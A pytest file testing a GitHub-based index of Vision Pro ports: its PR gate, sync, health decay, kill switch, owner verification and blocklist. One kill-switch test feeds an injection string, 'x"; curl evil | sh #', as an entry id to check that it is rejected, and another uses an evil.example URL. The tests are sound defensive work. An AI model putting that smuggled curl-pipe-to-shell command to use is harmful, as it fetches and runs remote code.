"""The gate, sync-state (U8), health (U2, U4, U13), kill switch (U12, U15), owner verification
(U14), blocklist scope (U15), curator's own (U19) and stable output (U17)."""

from __future__ import annotations

import json

import pytest
import yaml
from conftest import APP_ID, BOT_ID, OWNER_ID, SALT, SHA, STRANGER_ID, FakeHTTP, entry_yaml, git, list_entry, write_entry

from avpindex import blocklist, gate, generate, health, killswitch, messages, store, sync
from avpindex.gate import STAGE1, STAGE2, stage2_marker


@pytest.fixture
def event(tmp_path_factory, monkeypatch):
    folder = tmp_path_factory.mktemp("event")

    def set_event(payload: dict, name: str = "pull_request_target", **env):
        path = folder / "event.json"
        path.write_text(json.dumps(payload))
        monkeypatch.setenv("GITHUB_EVENT_PATH", str(path))
        monkeypatch.setenv("GITHUB_EVENT_NAME", name)
        for key, value in env.items():
            monkeypatch.setenv(key, value)
    return set_event


def pr_event(gh, number, action="opened", label=None, sender=BOT_ID):
    payload = {"action": action, "pull_request": gh.pr(number), "sender": {"id": sender}}
    if label:
        payload["label"] = {"name": label}
    return payload


class TestGate:
    def test_happy_path_queues(self, rt, gh, event):
        gh.add_repo("trevorbilt-bot/good", 11)
        gh.open_pr(1, "trevorbilt-bot", "entries/good.yaml", "added", entry_yaml("good", "trevorbilt-bot/good"))
        event(pr_event(gh, 1))
        assert gate.run(rt) == []
        head = gh.prs[1]["head"]["sha"]
        assert gh.latest(head, "gate/policy")["conclusion"] == "success"
        assert gh.latest(head, STAGE1)["conclusion"] == "success"
        stage2 = gh.latest(head, STAGE2)
        assert stage2["status"] == "in_progress" and stage2["external_id"] == f"11@{SHA(11)}"
        assert {"stage1:pass", "stage2:queued"} <= gh.labels_of(1)
        assert "Thanks for adding good port! Everything checked out" in gh.bot_comment(1)

    def test_fail_and_route_messages(self, rt, gh, event):
        gh.add_repo("trevorbilt-bot/noinstall", 12, install=None)
        gh.open_pr(2, "trevorbilt-bot", "entries/noinstall.yaml", "added",
                   entry_yaml("noinstall", "trevorbilt-bot/noinstall"))
        event(pr_event(gh, 2))
        gate.run(rt)
        assert "needs-author" in gh.labels_of(2) and gh.latest(gh.prs[2]["head"]["sha"], STAGE2) is None
        assert "A few things need fixing" in gh.bot_comment(2) and "S1-07" in gh.bot_comment(2)
        gh.add_repo("trevorbilt-bot/thirdparty", 13)
        gh.open_pr(3, "edgytoast", "entries/thirdparty.yaml", "added",
                   entry_yaml("thirdparty", "trevorbilt-bot/thirdparty"))
        event(pr_event(gh, 3, sender=OWNER_ID))
        gate.run(rt)
        assert "needs-owner" in gh.labels_of(3)
        assert ("Everything required is in place, but this PR doesn't come from the repo's owner (or the person "
                "who first listed it), so the curator will take a quick look") in gh.bot_comment(3)
        gh.add_labels(3, ["owner:scan"])
        event(pr_event(gh, 3, action="labeled", label="owner:scan", sender=OWNER_ID))
        gate.run(rt)
        assert "stage2:queued" in gh.labels_of(3) and "needs-owner" not in gh.labels_of(3)
        assert "S1-08" in gh.latest(gh.prs[3]["head"]["sha"], STAGE1)["output"]["summary"]

    def test_only_owner_labels(self, rt, gh, event):
        gh.add_repo("trevorbilt-bot/good", 11)
        gh.open_pr(1, "trevorbilt-bot", "entries/good.yaml", "added", entry_yaml("good", "trevorbilt-bot/good"),
                   labels=("owner:scan",))
        event(pr_event(gh, 1, action="labeled", label="owner:scan", sender=STRANGER_ID))
        gate.run(rt)
        assert "owner:scan" not in gh.labels_of(1)
        assert any("Only the maintainer" in c["body"] for c in gh.comment_store[1])

    def test_invalid(self, rt, gh, event):
        gh.open_pr(4, "trevorbilt-bot", "entries/x.yaml", "added", b"{}")
        gh.pr_file_list[4].append({"filename": ".github/workflows/pr-gate.yml", "status": "modified"})
        event(pr_event(gh, 4))
        gate.run(rt)
        check = gh.latest(gh.prs[4]["head"]["sha"], "gate/policy")
        assert check["conclusion"] == "failure" and "exactly one file" in check["output"]["title"]

    def test_flagged_push_keeps_scanned_external_id(self, rt, gh, event):
        gh.add_repo("trevorbilt-bot/sus", 14)
        gh.open_pr(5, "trevorbilt-bot", "entries/sus.yaml", "added", entry_yaml("sus", "trevorbilt-bot/sus"),
                   labels=("stage2:flagged", "needs-owner"), head=SHA(500))
        messages.upsert(rt, 5, "flagged", flagged=f"14@{SHA(1)}", flag_pointers=[{"file": "x.sh", "category": "c"}],
                        flag_repo="trevorbilt-bot/sus")
        state = store.State.load(rt.root)
        blocklist.add_flag(state, SALT, 14)
        state.save()
        gh.prs[5]["head"]["sha"] = SHA(501)
        gh.files[(gh.repo_full.lower(), "entries/sus.yaml", SHA(501))] = entry_yaml("sus", "trevorbilt-bot/sus")
        event(pr_event(gh, 5, action="synchronize"))
        gate.run(rt)
        stage2 = gh.latest(SHA(501), STAGE2)
        assert stage2["conclusion"] == "failure" and stage2["external_id"] == f"14@{SHA(1)}"
        assert "S1-17" not in gh.latest(SHA(501), STAGE1)["output"]["summary"]
        assert "stage2:queued" not in gh.labels_of(5) and "x.sh" in gh.bot_comment(5)
        event(pr_event(gh, 5, action="reopened"))  # reopening doesn't requeue either
        gate.run(rt)
        assert "stage2:queued" not in gh.labels_of(5)

    def test_source_ref_edit_is_scanned(self, rt, gh, event):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        gh.add_branch("trevorbilt-bot/good", "vision-pro", SHA(12))
        gh.open_pr(6, "trevorbilt-bot", "entries/good.yaml", "modified",
                   entry_yaml("good", "trevorbilt-bot/good", source_ref="vision-pro"))
        event(pr_event(gh, 6))
        assert gate.run(rt) == []
        assert gh.latest(gh.prs[6]["head"]["sha"], STAGE1)["external_id"] == f"11@{SHA(12)}"
        assert "stage2:queued" in gh.labels_of(6)

    def test_unchanged_carried_and_draft(self, rt, gh, event):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        gh.open_pr(6, "trevorbilt-bot", "entries/good.yaml", "modified",
                   entry_yaml("good", "trevorbilt-bot/good", status_notes="typo"))
        event(pr_event(gh, 6))
        assert gate.run(rt) == [6]
        assert gh.latest(gh.prs[6]["head"]["sha"], STAGE2)["output"]["title"].startswith("Not required: unchanged")
        gh.add_repo("trevorbilt-bot/new", 15)
        gh.open_pr(7, "trevorbilt-bot", "entries/new.yaml", "added", entry_yaml("new", "trevorbilt-bot/new"))
        messages.upsert(rt, 7, "x", passed={f"15@{SHA(15)}": 88})
        event(pr_event(gh, 7))
        assert gate.run(rt) == [7]
        check = gh.latest(gh.prs[7]["head"]["sha"], STAGE2)
        assert check["output"]["title"].startswith("Carried forward") and '"confidence": 88' in check["output"]["summary"]
        gh.open_pr(8, "trevorbilt-bot", "entries/new2.yaml", "added", entry_yaml("new2", "trevorbilt-bot/new"),
                   draft=True)
        gh.add_repo("trevorbilt-bot/new2", 16)
        gh.files[(gh.repo_full.lower(), "entries/new2.yaml", gh.prs[8]["head"]["sha"])] = entry_yaml("new2", "trevorbilt-bot/new2")
        event(pr_event(gh, 8))
        gate.run(rt)
        assert gh.latest(gh.prs[8]["head"]["sha"], STAGE2)["output"]["title"] == "Waiting until the PR is marked ready"
        assert "stage2:queued" not in gh.labels_of(8)

    def test_removal_and_pulled(self, rt, gh, event):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        gh.open_pr(9, "trevorbilt-bot", "entries/good.yaml", "removed", None)
        event(pr_event(gh, 9))
        assert gate.run(rt) == [9]
        assert gh.latest(gh.prs[9]["head"]["sha"], STAGE2)["output"]["title"] == "Not required: self-removal"
        state = store.State.load(rt.root)
        state.lifecycle["good"]["status"] = "pulled"
        state.save()
        gh.open_pr(10, "trevorbilt-bot", "entries/good.yaml", "modified", entry_yaml("good", "trevorbilt-bot/good"))
        event(pr_event(gh, 10))
        gate.run(rt)
        assert "needs-owner" in gh.labels_of(10) and "needs-author" not in gh.labels_of(10)

    def test_owner_verify(self, rt, gh, event):
        """U14."""
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo, scanned=SHA(11))
        git(rt.root, "add", "-A")
        git(rt.root, "commit", "-qm", "listed")

        def verify_pr(number, records):
            body = yaml.safe_dump({"schema_version": 1, "records": records}).encode()
            gh.open_pr(number, "edgytoast", "verification/owner-verified.yaml", "modified", body)
            event(pr_event(gh, number, sender=OWNER_ID))
            gate.run(rt)
            return gh.latest(gh.prs[number]["head"]["sha"], STAGE1)

        good = {"verified": True, "verified_on": "2026-10-10", "verified_commit": SHA(11), "repo_id": 11}
        assert verify_pr(20, {"good": good})["conclusion"] == "success"
        wrong = verify_pr(21, {"good": dict(good, verified_commit=SHA(12))})
        assert wrong["conclusion"] == "failure" and "doesn't match its scanned commit" in wrong["output"]["summary"]
        assert "doesn't match the repo" in verify_pr(22, {"good": dict(good, repo_id=99)})["output"]["summary"]
        # An older record whose entry has since been rescanned doesn't make a new PR fail.
        (rt.root / store.VERIFIED).write_text(yaml.safe_dump({"schema_version": 1, "records": {
            "good": dict(good, verified_commit=SHA(3))}}))
        repo2 = gh.add_repo("trevorbilt-bot/other", 12)
        list_entry(rt, "other", repo2, scanned=SHA(12))
        other = {"verified": True, "verified_on": "2026-10-10", "verified_commit": SHA(12), "repo_id": 12}
        assert verify_pr(23, {"good": dict(good, verified_commit=SHA(3)), "other": other})["conclusion"] == "success"


def merge_commit(rt, gh, number, author, path, content, *, s1=None, s2=None, title=None):
    """Make a squash-merge commit on main and register its PR and checks."""
    file = rt.root / path
    if content is None:
        file.unlink()
    else:
        file.write_bytes(content)
    git(rt.root, "add", "-A")
    git(rt.root, "commit", "-qm", title or f"entry (#{number})")
    sha = git(rt.root, "rev-parse", "HEAD").strip()
    head = SHA(8_000_000 + number)
    gh.pulls_for_commit[sha] = [{"number": number, "merged_at": "2026-10-03T00:00:00Z", "merge_commit_sha": sha,
                                 "head": {"sha": head}, "user": dict(gh.users[author.lower()])}]
    gh.comment_store.setdefault(number, [])
    if s1:
        gh.create_check(head, STAGE1, conclusion="success", external_id=s1)
    if s2:
        conclusion, marker, ext = s2
        gh.create_check(head, STAGE2, conclusion=conclusion, external_id=ext, summary=marker)
    return sha


class TestSync:
    """U8 and U19."""

    def test_replays_adds_edits_and_removals(self, rt, gh):
        gh.add_repo("trevorbilt-bot/good", 11)
        gh.add_repo("trevorbilt-bot/moved", 12)
        merge_commit(rt, gh, 1, "trevorbilt-bot", "entries/good.yaml", entry_yaml("good", "trevorbilt-bot/good"),
                     s1=f"11@{SHA(11)}", s2=("success", stage2_marker(kind="scan", confidence=91), f"11@{SHA(11)}"))
        merge_commit(rt, gh, 2, "trevorbilt-bot", "entries/good.yaml", entry_yaml("good", "trevorbilt-bot/moved"),
                     s1=f"12@{SHA(12)}", s2=("success", stage2_marker(kind="scan", confidence=85), f"12@{SHA(12)}"))
        git(rt.root, "commit", "-q", "--allow-empty", "-m", "kill-switch: pull x [skip ci]")  # App commit
        merge_commit(rt, gh, 3, "trevorbilt-bot", "entries/good.yaml", None)
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        record = state.lifecycle["good"]
        assert record["status"] == "withdrawn" and record["repo_id"] == 12
        assert state.health["good"]["scanned_commit"] == SHA(12) and state.health["good"]["scan_confidence"] == 85
        assert state.sync["last_synced_sha"] == git(rt.root, "rev-parse", "HEAD").strip()
        assert "is now listed" in gh.bot_comment(1)

    def test_bypass_rules(self, rt, gh):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        merge_commit(rt, gh, 1, "trevorbilt-bot", "entries/good.yaml", entry_yaml("good", "trevorbilt-bot/good"),
                     s1=f"11@{SHA(11)}", s2=("success", stage2_marker(kind="scan", confidence=91), f"11@{SHA(11)}"))
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        state.save()
        # Owner bypass of a same-repo edit with no Stage 2 result: scan record unchanged.
        merge_commit(rt, gh, 2, "edgytoast", "entries/good.yaml",
                     entry_yaml("good", "trevorbilt-bot/good", status_notes="typo"), s1=f"11@{SHA(20)}")
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        assert state.health["good"]["scanned_commit"] == SHA(11) and state.health["good"]["scan_kind"] == "automated"
        assert state.lifecycle["good"]["owner_approved"] is False
        state.save()
        # With a flag result: pin that result's commit, curator-reviewed, flag record removed.
        blocklist.add_flag(state, SALT, 11)
        state.save()
        merge_commit(rt, gh, 3, "edgytoast", "entries/good.yaml",
                     entry_yaml("good", "trevorbilt-bot/good", status_notes="v2"), s1=f"11@{SHA(31)}",
                     s2=("failure", stage2_marker(kind="result", result="flag"), f"11@{SHA(30)}"))
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        assert state.health["good"]["scanned_commit"] == SHA(30)
        assert state.health["good"]["scan_kind"] == "curator-reviewed"
        assert state.lifecycle["good"]["owner_approved"] is True and not blocklist.is_flagged(state, SALT, 11)
        assert repo["id"] == 11

    def test_skip_ci_bypass_is_caught_up(self, rt, gh):
        """T13 in miniature: an add merged without a scan is listed curator-reviewed from stage1's commit."""
        gh.add_repo("trevorbilt-bot/q6", 26)
        merge_commit(rt, gh, 1, "trevorbilt-bot", "entries/q6.yaml", entry_yaml("q6", "trevorbilt-bot/q6"),
                     s1=f"26@{SHA(26)}", title="Add port [skip ci]")
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        assert state.lifecycle["q6"]["status"] == "listed"
        assert state.health["q6"]["scan_kind"] == "curator-reviewed" and state.health["q6"]["scanned_commit"] == SHA(26)

    def test_stage2_result_for_another_repo_is_ignored(self, rt, gh):
        gh.add_repo("trevorbilt-bot/b", 12)
        merge_commit(rt, gh, 1, "edgytoast", "entries/good.yaml", entry_yaml("good", "trevorbilt-bot/b"),
                     s1=f"12@{SHA(12)}", s2=("failure", stage2_marker(kind="result", result="flag"), f"11@{SHA(5)}"))
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        assert state.health["good"]["scanned_commit"] == SHA(12)

    def test_pulled_entry_merge_is_refused(self, rt, gh):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo, write=False)
        state = store.State.load(rt.root)
        state.lifecycle["good"]["status"] = "pulled"
        state.save()
        merge_commit(rt, gh, 1, "edgytoast", "entries/good.yaml", entry_yaml("good", "trevorbilt-bot/good"),
                     s1=f"11@{SHA(11)}")
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        assert state.lifecycle["good"]["status"] == "pulled"
        assert any(i["title"] == "Triage: good" for i in gh.issue_store.values())

    def test_curator_own(self, rt, gh):
        """U19."""
        gh.add_repo("stranger/theirs", 40)
        merge_commit(rt, gh, 1, "stranger", "entries/theirs.yaml",
                     entry_yaml("theirs", "stranger/theirs", dev="edgytoast"), s1=f"40@{SHA(40)}",
                     s2=("success", stage2_marker(kind="scan", confidence=90), f"40@{SHA(40)}"))
        gh.add_repo("edgytoast/mine", 41)
        merge_commit(rt, gh, 2, "edgytoast", "entries/mine.yaml", entry_yaml("mine", "edgytoast/mine", dev="edgytoast"),
                     s1=f"41@{SHA(41)}", s2=("success", stage2_marker(kind="scan", confidence=90), f"41@{SHA(41)}"))
        gh.add_repo("trevorbilt-bot/own", 42)
        merge_commit(rt, gh, 3, "edgytoast", "entries/own.yaml", entry_yaml("own", "trevorbilt-bot/own", dev="edgytoast"),
                     s1=f"42@{SHA(42)}", s2=("success", stage2_marker(kind="scan", confidence=90), f"42@{SHA(42)}"))
        state = store.State.load(rt.root)
        sync.sync_all(rt, state)
        assert (state.health["theirs"]["curator_own"], state.lifecycle["theirs"]["owner_approved"]) == (False, False)
        assert (state.health["mine"]["curator_own"], state.lifecycle["mine"]["owner_approved"]) == (True, True)
        assert (state.health["own"]["curator_own"], state.lifecycle["own"]["owner_approved"]) == (True, False)
        assert state.health["theirs"]["github_verified"] is False


def set_policy(rt, **health_values):
    policy = store.load_policy(rt.root)
    policy["health"].update(health_values)
    rt.memo["policy"] = policy


class TestHealth:
    """U13, U4 and U2."""

    def setup_failing(self, rt, gh):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        git(rt.root, "add", "-A")
        git(rt.root, "commit", "-qm", "listed")
        gh.files.pop(("trevorbilt-bot/good", "AVP-INSTALL.md", SHA(11)))
        set_policy(rt, grace_days=0, confirm_runs_before_outreach=2)
        return repo

    def run_at(self, rt, monkeypatch, when):
        monkeypatch.setenv("AVP_NOW", when)
        health.run(rt)
        return store.State.load(rt.root)

    def test_decay_timing(self, rt, gh, monkeypatch):
        self.setup_failing(rt, gh)
        state = self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        assert state.health["good"]["health"] == "issues" and not gh.external_issues
        assert "May have issues" in (rt.root / "README.md").read_text()
        state = self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")
        assert len(gh.external_issues) == 1 and state.lifecycle["good"]["status"] == "listed"
        assert "2026-10-05" in gh.external_issues[0]["body"]
        state = self.run_at(rt, monkeypatch, "2026-10-06T06:17:00Z")
        assert state.lifecycle["good"]["status"] == "delisted-decay"
        assert gh.closed_external and "It has come off the index" in gh.external_comments[-1][2]
        readme = (rt.root / "README.md").read_text()
        assert "## Unavailable ports" in readme and SHA(11) in readme
        unavailable = readme.split("## Unavailable ports")[1].split("\n## ")[0]
        assert "](" not in unavailable and "@trevorbilt-bot" in unavailable  # plain text, no links

    def test_relisted_entry_starts_fresh(self, rt, gh, monkeypatch):
        self.setup_failing(rt, gh)
        self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        state = self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")
        from avpindex import lifecycle
        lifecycle.transition(state, "good", "pulled", "kill-switch")
        lifecycle.transition(state, "good", "listed", "kill-switch")
        state.save()
        state = self.run_at(rt, monkeypatch, "2026-10-06T06:17:00Z")
        assert state.lifecycle["good"]["status"] == "listed" and state.health["good"]["consecutive_failures"] == 1

    def test_recovery_and_leaving_close_outreach(self, rt, gh, monkeypatch):
        self.setup_failing(rt, gh)
        self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")
        gh.files[("trevorbilt-bot/good", "AVP-INSTALL.md", SHA(11))] = b"# back\n"
        state = self.run_at(rt, monkeypatch, "2026-10-06T06:17:00Z")
        assert state.health["good"]["health"] == "ok" and state.health["good"]["outreach_issue_url"] is None
        assert "Everything checks out again" in gh.external_comments[-1][2]
        gh.files.pop(("trevorbilt-bot/good", "AVP-INSTALL.md", SHA(11)))
        self.run_at(rt, monkeypatch, "2026-10-07T06:17:00Z")
        state = self.run_at(rt, monkeypatch, "2026-10-08T06:17:00Z")
        state.lifecycle["good"]["status"] = "pulled"
        state.save()
        self.run_at(rt, monkeypatch, "2026-10-09T06:17:00Z")
        assert "Its listing is no longer on the index" in gh.external_comments[-1][2]

    def test_missing_source_ref_branch_reaches_the_developer(self, rt, gh, monkeypatch):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo, write=False)
        write_entry(rt.root, "good", "trevorbilt-bot/good", source_ref="vision-pro")  # no such branch
        git(rt.root, "add", "-A")
        git(rt.root, "commit", "-qm", "listed")
        set_policy(rt, grace_days=0, confirm_runs_before_outreach=2)
        self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        state = self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")
        assert gh.external_issues[0]["repo"] == "trevorbilt-bot/good" and "source_ref" in gh.external_issues[0]["body"]
        assert state.health["good"]["license"] == {"spdx": "MIT", "kind": "open-source"}  # facts left alone

    def test_fallback_to_health_tracking(self, rt, gh, monkeypatch):
        self.setup_failing(rt, gh)
        gh.repos["trevorbilt-bot/good"]["has_issues"] = False
        self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        state = self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")
        url = state.health["good"]["outreach_issue_url"]
        assert url and "avp-ports-index-staging/issues" in url and not gh.external_issues
        tracking = [i for i in gh.issue_store.values() if i["title"] == "Health tracking"][0]
        assert "@trevorbilt-bot" in gh.comment_store[tracking["number"]][-1]["body"]

    def test_unreachable_outreach_issue_doesnt_stop_the_check(self, rt, gh, monkeypatch):
        from avpindex.checks import GitHubError
        self.setup_failing(rt, gh)
        self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")

        def gone(*a, **kw):
            raise GitHubError(404, "Not Found")

        monkeypatch.setattr(gh, "close_issue", gone)
        original = gh.comment
        monkeypatch.setattr(gh, "comment", lambda n, b, repo=None, token=None:
                            gone() if repo and repo != gh.repo_full else original(n, b, repo=repo, token=token))
        state = self.run_at(rt, monkeypatch, "2026-10-06T06:17:00Z")
        assert state.lifecycle["good"]["status"] == "delisted-decay"
        assert state.health["good"]["outreach_issue_url"] is None
        tracking = [i for i in gh.issue_store.values() if i["title"] == "Health tracking"][0]
        assert "Couldn't update" in gh.comment_store[tracking["number"]][-1]["body"]

    def test_warning_text_is_escaped(self, rt, gh, monkeypatch):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        url = "https://evil.example/x@someone"
        state = store.State.load(rt.root)
        write_entry(rt.root, "good", "trevorbilt-bot/good", upstream=[url])
        rt.http = FakeHTTP({url: 503})
        self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        tracking = [i for i in gh.issue_store.values() if i["title"] == "Health tracking"][0]
        body = gh.comment_store[tracking["number"]][-1]["body"]
        assert "@someone" not in body and "@\u2060someone" in body
        assert state

    def test_warnings_never_decay(self, rt, gh, monkeypatch):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        rt.http = FakeHTTP({"https://github.com/trevorbilt-bot/good": 429})
        state = self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        assert state.health["good"]["health"] == "ok" and state.health["good"]["warnings"] == ["S1-10"]

    def test_repo_identity_pulls_then_restore(self, rt, gh, monkeypatch, event):
        """U2: a reclaimed repo is pulled at once; restore re-records repo_id and it stays listed."""
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        gh.repos["trevorbilt-bot/good"]["id"] = 99
        state = self.run_at(rt, monkeypatch, "2026-10-04T06:17:00Z")
        assert state.lifecycle["good"]["status"] == "pulled"
        assert any(i["title"] == "Triage: good" for i in gh.issue_store.values())
        event({}, "workflow_dispatch", INPUT_ENTRY_ID="good", INPUT_ACTION="restore", INPUT_BLOCKLIST="false")
        killswitch.run(rt)
        state = store.State.load(rt.root)
        assert state.lifecycle["good"]["status"] == "listed" and state.lifecycle["good"]["repo_id"] == 99
        state = self.run_at(rt, monkeypatch, "2026-10-05T06:17:00Z")
        assert state.lifecycle["good"]["status"] == "listed"

    def test_dry_run_writes_nothing(self, rt, gh, monkeypatch):
        self.setup_failing(rt, gh)
        rt.dry_run = gh.dry_run = True
        before = (rt.root / store.HEALTH).read_text()
        monkeypatch.setenv("AVP_NOW", "2026-10-04T06:17:00Z")
        rt.committer = lambda mutate, message: None  # the real writer never commits in a dry run
        health.run(rt)
        assert (rt.root / store.HEALTH).read_text() == before and not gh.external_issues


class TestKillSwitch:
    def ks(self, rt, event, entry_id, action, block="false"):
        event({}, "workflow_dispatch", INPUT_ENTRY_ID=entry_id, INPUT_ACTION=action, INPUT_BLOCKLIST=block)
        return killswitch.run(rt)

    def test_pull_restore_takedown(self, rt, gh, event):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        git(rt.root, "add", "-A")
        git(rt.root, "commit", "-qm", "listed")
        self.ks(rt, event, "good", "pull")
        state = store.State.load(rt.root)
        assert state.lifecycle["good"]["status"] == "pulled" and not blocklist.hashes(state)
        self.ks(rt, event, "good", "restore")
        state = store.State.load(rt.root)
        assert state.lifecycle["good"]["status"] == "listed" and state.lifecycle["good"]["owner_approved"]
        self.ks(rt, event, "good", "takedown")
        state = store.State.load(rt.root)
        assert state.lifecycle["good"]["status"] == "taken-down" and not (rt.root / "entries/good.yaml").exists()
        assert len(blocklist.hashes(state)) == 3  # U15: repo id, repo name, slug
        assert '"tombstones": [\n    {\n      "id": "good"' in (rt.root / "feed/v1/index.json").read_text()
        self.ks(rt, event, "good", "restore")
        state = store.State.load(rt.root)
        assert state.lifecycle["good"]["status"] == "listed" and (rt.root / "entries/good.yaml").exists()
        assert not blocklist.hashes(state)

    def test_pull_with_blocklist_and_invalid_id(self, rt, gh, event):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        self.ks(rt, event, "good", "pull", "true")
        assert len(blocklist.hashes(store.State.load(rt.root))) == 3
        assert "isn't a valid entry id" in self.ks(rt, event, 'x"; curl evil | sh #', "pull")

    def test_label_path_parses_form(self, rt, gh, event):
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo)
        issue = gh.create_issue("Report", "### Entry id\n\ngood\n\n### Problem type\n\nmalicious\n", labels=["report"])
        event({"action": "labeled", "label": {"name": "kill-switch"}, "sender": {"id": OWNER_ID},
               "issue": issue}, "issues")
        killswitch.run(rt)
        assert store.State.load(rt.root).lifecycle["good"]["status"] == "pulled"

    def test_approve_and_restore_of_held_entry(self, rt, gh, event):
        """U12."""
        repo = gh.add_repo("trevorbilt-bot/good", 11)
        list_entry(rt, "good", repo, scanned=SHA(5), owner_approved=True)
        state = store.State.load(rt.root)
        state.health["good"].update(flagged_commit=SHA(6), rescan_hold=True, rescan_after="2026-10-05T00:00:00Z")
        blocklist.add_flag(state, SALT, 11)
        state.save()
        self.ks(rt, event, "good", "restore")
        state = store.State.load(rt.root)
        assert not state.health["good"]["rescan_hold"] and state.health["good"]["flagged_commit"] == SHA(6)
        assert state.health["good"]["rescan_after"] is None
        assert blocklist.is_flagged(state, SALT, 11)
        self.ks(rt, event, "good", "approve")
        state = store.State.load(rt.root)
        assert state.health["good"]["scanned_commit"] == SHA(6) and state.health["good"]["flagged_commit"] is None
        assert state.health["good"]["scan_kind"] == "curator-reviewed" and not blocklist.is_flagged(state, SALT, 11)
        assert "no flagged commit" in self.ks(rt, event, "good", "approve")


def test_blocklist_label_scope(rt, gh, event, monkeypatch):
    """U15: entry-add blocks repo and slug; an edit that repoints blocks only the new repo."""
    gh.add_repo("trevorbilt-bot/sus", 14)
    gh.open_pr(1, "trevorbilt-bot", "entries/sus.yaml", "added", entry_yaml("sus", "trevorbilt-bot/sus"),
               labels=("blocklist",))
    event(pr_event(gh, 1, action="labeled", label="blocklist", sender=OWNER_ID))
    gate.blocklist_label(rt)
    state = store.State.load(rt.root)
    assert blocklist.is_blocked(state, SALT, entry_id="sus") and blocklist.is_blocked(state, SALT, repo_id=14)
    assert gh.prs[1]["state"] == "closed" and "can't be resubmitted" in gh.bot_comment(1)
    repo = gh.add_repo("trevorbilt-bot/good", 11)
    list_entry(rt, "good", repo)
    gh.add_repo("trevorbilt-bot/evil", 15)
    gh.open_pr(2, "trevorbilt-bot", "entries/good.yaml", "modified", entry_yaml("good", "trevorbilt-bot/evil"))
    event(pr_event(gh, 2, action="labeled", label="blocklist", sender=OWNER_ID))
    gate.blocklist_label(rt)
    state = store.State.load(rt.root)
    assert blocklist.is_blocked(state, SALT, repo_id=15)
    assert not blocklist.is_blocked(state, SALT, entry_id="good", repo_id=11, repo_names=("trevorbilt-bot/good",))


def test_intake(rt, gh, event):
    issue = gh.create_issue("Takedown", "x", labels=["takedown"])
    event({"action": "opened", "issue": issue}, "issues")
    killswitch.intake(rt)
    assert "admin@trevorbilt.com" in gh.comment_store[issue["number"]][-1]["body"]
    assert "triage" in gh.labels_of(issue["number"]) and gh.issue_store[issue["number"]]["assignees"] == ["edgytoast"]


def test_stable_output(rt, gh, monkeypatch):
    """U17."""
    repo = gh.add_repo("trevorbilt-bot/good", 11)
    list_entry(rt, "good", repo)
    generate.generate(rt.root, rt.repo)
    first = (rt.root / "feed/v1/index.json").read_text()
    monkeypatch.setenv("AVP_NOW", "2026-10-09T00:00:00Z")
    generate.generate(rt.root, rt.repo)
    assert (rt.root / "feed/v1/index.json").read_text() == first
    state = store.State.load(rt.root)
    state.health["good"]["health"] = "issues"
    state.save()
    generate.generate(rt.root, rt.repo)
    assert '"generated_at": "2026-10-09T00:00:00Z"' in (rt.root / "feed/v1/index.json").read_text()


def test_source_ref_facts_and_surfaces(rt, gh):
    repo = gh.add_repo("trevorbilt-bot/good", 11)
    gh.add_branch("trevorbilt-bot/good", "vision-pro", SHA(12))
    list_entry(rt, "good", repo, scanned=SHA(12))
    out = generate.generate(rt.root, rt.repo)
    assert json.loads(out["feed/v1/index.json"])["entries"][0]["source_ref"] is None
    assert "| Branch |" not in out["ports/good.md"]
    write_entry(rt.root, "good", "trevorbilt-bot/good", source_ref="vision-pro")
    state = store.State.load(rt.root)
    sync.repo_facts(rt, "good", store.load_entries(rt.root)[0]["good"], repo, state)
    assert state.health["good"]["last_commit_date"] == "2026-09-20T00:00:00Z"  # the branch's HEAD, not main's
    assert state.health["good"]["scan_state"] == "current"
    state.save()
    out = generate.generate(rt.root, rt.repo)
    assert "| Branch | `vision-pro` |" in out["ports/good.md"] and f"git checkout {SHA(12)}" in out["ports/good.md"]
    feed = json.loads(out["feed/v1/index.json"])
    assert feed["entries"][0]["source_ref"] == "vision-pro"


def test_play_modes_and_prebuilt_apps(rt, gh):
    repo = gh.add_repo("trevorbilt-bot/good", 11)
    list_entry(rt, "good", repo)
    write_entry(rt.root, "good", "trevorbilt-bot/good", experiences=["6dof-immersive", "3d-shared-space"])
    out = generate.generate(rt.root, rt.repo)
    assert "| Plays as | 3D shared space, 6DoF immersive |" in out["ports/good.md"]  # canonical order
